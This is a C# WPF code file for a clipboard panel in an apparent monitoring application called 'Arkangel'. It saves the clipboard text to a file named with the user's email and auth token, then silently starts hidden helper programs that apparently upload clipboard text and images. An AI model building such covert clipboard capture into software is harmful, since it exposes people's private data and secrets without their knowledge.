using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Arkangel
{
    /// <summary>
    /// Interaction logic for _Clipboard.xaml
    /// </summary>
    public partial class _Clipboard : UserControl
    {
        string email;
        string token;
        public _Clipboard()
        {

            InitializeComponent();
            _text.Text = Clipboard.GetText();
            _text.IsReadOnly = true;
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {

                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * from Users where id = (select id from current_user)", connect);
                    SQLiteDataReader r = sqlComm.ExecuteReader();
                    while (r.Read())
                    {
                        email = r["username"].ToString();
                    }
                    SQLiteCommand sqlCom = new SQLiteCommand(@"SELECT token from current_user", connect);
                    SQLiteDataReader rr = sqlCom.ExecuteReader();
                    while(rr.Read())
                    {
                        token = rr["token"].ToString();
                    }
                }
            }
            DateTime mydate = DateTime.Now;
            string date = mydate.ToString("yyyy_MM_dd");
            File.WriteAllText(@"..\\..\\Clipboard\\"+date+"-"+email+"-"+token+".txt", _text.Text);
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "upClipboardImg.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "upClipboardText.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
        }

        private void bt_change_Click(object sender, RoutedEventArgs e)
        {
            if (_text.IsReadOnly == false)
            {
                if (_text.Text != "")
                {
                    Clipboard.SetText(_text.Text);
                }
                _text.IsReadOnly = true;
            }
            else _text.IsReadOnly = false;
        }

        private void bt_file_Click(object sender, RoutedEventArgs e)
        {
            CB_File cB_File = new CB_File();
            cB_File.Show();
        }

        private void bt_Picture_Click(object sender, RoutedEventArgs e)
        {
            CB_Pic cB_Pic = new CB_Pic();
            cB_Pic.Show();
        }
    }
}
